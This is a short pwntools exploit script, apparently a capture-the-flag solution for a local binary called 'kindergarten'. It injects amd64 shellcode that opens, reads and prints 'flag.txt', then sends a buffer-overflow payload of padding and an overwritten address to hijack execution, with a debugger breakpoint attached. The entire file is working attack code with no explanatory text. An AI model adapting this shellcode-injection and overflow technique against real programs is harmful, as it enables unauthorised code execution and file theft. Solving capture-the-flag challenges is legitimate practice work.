from pwn import *

io = process('./kindergarten')
print io.recv()

context.arch = 'amd64'

shellcode = '''
    mov rax,2
    mov rdi, 0x7478742e67616c66
    push rdi
    push rsp
    pop rdi
    mov rdx, 0
    mov rsi, 0

    syscall

    mov rdi, rax
    mov rax, 0
    mov rsi, 0x602120
    mov rdx, 50

    syscall

    mov rax, 1
    mov rdi, 1
    mov rsi, 0x602120
    mov rdx, 50

    syscall

'''

shellcode = 'y' + asm(shellcode)
print len(shellcode)
io.send(shellcode)
print io.recv()


for i in range(4):
    io.sendline('y')
    io.recv()
    io.sendline('A'*10)
    io.recv()
    print i

payload = ''
payload += 'X'*0x80
payload += 'JUNK'*3
payload += p64(0x602041)
payload += '\x00'

gdb.attach(io,'b*0x400aea')

print payload 
io.sendline(payload)

io.interactive()
